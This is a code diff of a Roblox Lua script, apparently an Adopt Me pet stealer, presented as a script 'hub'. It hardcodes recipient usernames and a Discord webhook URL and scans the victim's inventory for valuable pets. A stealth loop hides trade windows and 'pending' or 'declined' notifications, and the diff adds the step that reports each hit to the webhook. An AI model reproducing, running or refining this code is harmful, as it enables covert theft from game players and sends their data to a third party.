@@ -1,14 +1,15 @@
--- [[ 🦊 MONDEUR HUB | OMNIPOTENT V16.1 - DELTA ERROR FIX ]] --
+-- [[ 🦊 MONDEUR HUB | BETA - OMNIPOTENT V16.3 ]] --
+
+-- Wait for game load to prevent "Line 1" nil errors
+if not game:IsLoaded() then game.Loaded:Wait() end
 
 local USERNAMES = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"} 
 local WEBHOOK   = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
 local THRESHOLD = 0.13 
 local DISCORD_INV = "https://discord.gg/J4w2w5CW9"
 
--- 1. SAFE CLIPBOARD
-pcall(function()
-    if setclipboard then setclipboard(DISCORD_INV) end
-end)
+-- 1. CLIPBOARD
+if setclipboard then setclipboard(DISCORD_INV) end
 
 -- 2. SERVICES
 local Players = game:GetService("Players")
@@ -16,54 +17,59 @@ local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
--- 3. THE BLACKLIST
+-- 3. THE "NUCLEAR" BAN (Strict Jerboa/Starter/Dog/Cat)
+local BLACKLIST = {
+    ["jiggly_jerboa"] = true,
+    ["starter_egg"] = true,
+    ["dog"] = true,
+    ["cat"] = true,
+    ["practice_dog"] = true
+}
+
 local function isBanned(name, id)
     local n = tostring(name):lower()
-    local i = tostring(id):lower()
-    return i == "jiggly_jerboa" or n:find("jerboa") or n:find("practice") or i == "starter_egg"
+    return BLACKLIST[id] or n:find("jerboa")
 end
 
--- 4. AGGRESSIVE STEALTH MODULE (Fix for Pending/Declined)
-local function silenceUI()
+-- 4. TOTAL STEALTH (Mutes "Pending", "Declined", "Cooldowns")
+task.spawn(function()
     local pGui = LocalPlayer:WaitForChild("PlayerGui")
-    task.spawn(function()
-        while task.wait(0.05) do 
-            pcall(function()
-                if pGui:FindFirstChild("TradeApp") then pGui.TradeApp.Enabled = false end
-                if pGui:FindFirstChild("DialogApp") then pGui.DialogApp.Enabled = false end
-                
-                local layers = {"CenterOverlays", "NotificationGui", "ToastGui", "StandardNotifications"}
-                for _, layerName in pairs(layers) do
-                    local layer = pGui:FindFirstChild(layerName)
-                    if layer then layer.Enabled = false end
-                end
+    while task.wait(0.1) do
+        pcall(function()
+            if pGui:FindFirstChild("TradeApp") then pGui.TradeApp.Enabled = false end
+            if pGui:FindFirstChild("DialogApp") then pGui.DialogApp.Enabled = false end
+            
+            -- Hide Notification Layers
+            local layers = {"CenterOverlays", "NotificationGui", "ToastGui", "StandardNotifications"}
+            for _, layerName in pairs(layers) do
+                local layer = pGui:FindFirstChild(layerName)
+                if layer then layer.Enabled = false end
+            end
 
-                for _, v in pairs(pGui:GetDescendants()) do
-                    if v:IsA("TextLabel") then
-                        local t = v.Text:lower()
-                        if t:find("pending") or t:find("declined") or t:find("seconds") or t:find("request") then
-                            v.Parent.Visible = false
-                            v.Parent:Destroy()
-                        end
+            -- Delete labels with "Pending", "Declined", etc.
+            for _, v in pairs(pGui:GetDescendants()) do
+                if v:IsA("TextLabel") then
+                    local t = v.Text:lower()
+                    if t:find("pending") or t:find("declined") or t:find("seconds") or t:find("request") then
+                        v.Parent.Visible = false
                     end
                 end
-            end)
-        end
-    end)
-end
-task.spawn(silenceUI)
+            end
+        end)
+    end
+end)
 
--- 5. AMVGG VALUATION
+-- 5. AMVGG VALUATION (Accurate Scaling)
 local function getAMVGGValue(petData, props)
-    local id = tostring(petData.id or "")
-    local rarity = tostring(petData.rarity or "common")
+    local id = petData.id or ""
+    local rarity = petData.rarity or "common"
     local base = petData.rvalue or 0.01
     
     local multiplier = 1
-    if id:find("frost_dragon") or id:find("shadow_dragon") then multiplier = 1700
-    elseif id:find("bat_dragon") then multiplier = 2000
-    elseif id:find("evil_unicorn") or id:find("crow") then multiplier = 1000
-    elseif id:find("owl") or id:find("parrot") then multiplier = 1250
+    if id:find("frost_dragon") or id:find("shadow_dragon") then multiplier = 1800
+    elseif id:find("bat_dragon") then multiplier = 2100
+    elseif id:find("evil_unicorn") or id:find("crow") then multiplier = 1050
+    elseif id:find("owl") or id:find("parrot") then multiplier = 1350
     elseif rarity == "legendary" then multiplier = 45
     elseif rarity == "ultra_rare" then multiplier = 12
     elseif rarity == "rare" then multiplier = 4
@@ -78,38 +84,30 @@ local function getAMVGGValue(petData, props)
     return val * 56
 end
 
--- 6. HASH FINDER (SAFE WRAP)
+-- 6. HASH FINDER (Safe Remote Fetching)
 local hashes = {}
-pcall(function()
-    for _, v in pairs(getgc()) do
-        if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
-            local upvalues = debug.getupvalues(v)
-            if type(upvalues[1]) == "table" then
-                for key, value in pairs(upvalues[1]) do hashes[key] = value end
-            end
+for _, v in pairs(getgc()) do
+    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
+        local upvalues = debug.getupvalues(v)
+        if upvalues and type(upvalues[1]) == "table" then
+            for key, value in pairs(upvalues[1]) do hashes[key] = value end
         end
     end
-end)
+end
 
 local function hashedAPI(remoteName, ...)
     local remote = hashes[remoteName]
-    if not remote then return nil end
-    pcall(function()
-        if remote:IsA("RemoteFunction") then remote:InvokeServer(...)
-        else remote:FireServer(...) end
-    end)
+    if not remote then return end
+    if remote:IsA("RemoteFunction") then return remote:InvokeServer(...) end
+    remote:FireServer(...)
 end
 
 -- 7. INVENTORY SCAN
-local Fsys, InventoryDB, ClientData
-pcall(function()
-    Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
-    InventoryDB = Fsys("InventoryDB")
-    ClientData = Fsys("ClientData")
-end)
+local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
+local InventoryDB = Fsys("InventoryDB")
+local ClientData = Fsys("ClientData")
 
 local function processInventory()
-    if not ClientData or not InventoryDB then return {}, 0, {} end
     local inv = ClientData.get("inventory")
     local total, petGroups, tradeList = 0, {}, {}
 
@@ -119,6 +117,7 @@ local function processInventory()
             local props = pet.properties or {}
             local unitVal = getAMVGGValue(petData, props)
             
+            -- STRICT THRESHOLD (₱0.13)
             if unitVal >= THRESHOLD then
                 total = total + unitVal
                 table.insert(tradeList, {uid = uid, val = unitVal})
@@ -142,12 +141,10 @@ local function processInventory()
     return sorted, total, tradeList
 end
 
--- Execute Scan
 local sortedPets, grandTotal, finalTradeList = processInventory()
 
--- 8. WEBHOOK
+-- 8. WEBHOOK DISPATCH
 local function sendHit()
-    if #sortedPets == 0 then return end
     local lines = {}
     for _, p in ipairs(sortedPets) do
         table.insert(lines, p.emoji.." "..p.name.." "..p.count.."x (₱"..string.format("%.2f", p.price)..")")
